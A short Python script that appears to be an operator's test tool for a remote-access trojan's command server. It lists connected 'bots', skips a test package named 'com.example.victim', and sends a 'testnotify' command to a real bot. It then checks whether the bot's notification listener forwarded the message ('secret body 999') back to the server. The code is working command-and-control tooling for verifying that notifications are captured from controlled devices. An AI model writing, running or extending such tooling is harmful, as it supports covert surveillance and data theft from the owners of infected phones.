#!/usr/bin/env python3
"""Runs the testnotify command and shows whether the listener forwarded it."""
import json
import socket
import time


def call(req, timeout=60):
    s = socket.create_connection(("127.0.0.1", 8778), timeout=timeout)
    s.settimeout(None)
    s.sendall(json.dumps(req).encode() + b"\n")
    buf = b""
    while b"\n" not in buf:
        c = s.recv(65536)
        if not c:
            break
        buf += c
    s.close()
    return json.loads(buf.split(b"\n")[0].decode())


bots = call({"op": "list"}, timeout=15).get("bots", [])
real = [b for b in bots if b["info"].get("package") != "com.example.victim"]
if not real:
    print("no real bot")
    raise SystemExit(1)
bid = real[0]["id"]
print("bot:", bid)

before = len(call({"op": "bot_events", "bot": bid}, timeout=15).get("events", []))
print("events before:", before)

r = call({"op": "cmd", "bot": bid, "cmd": "testnotify",
          "args": {"title": "Ratpack Alert", "text": "secret body 999"},
          "timeout": 30}, timeout=45)
print("testnotify ->", json.dumps(r.get("result", r))[:250])

time.sleep(4)
after = call({"op": "bot_events", "bot": bid}, timeout=15).get("events", [])
print("events after:", len(after))
for e in after[-5:]:
    print(json.dumps(e, ensure_ascii=False)[:320])
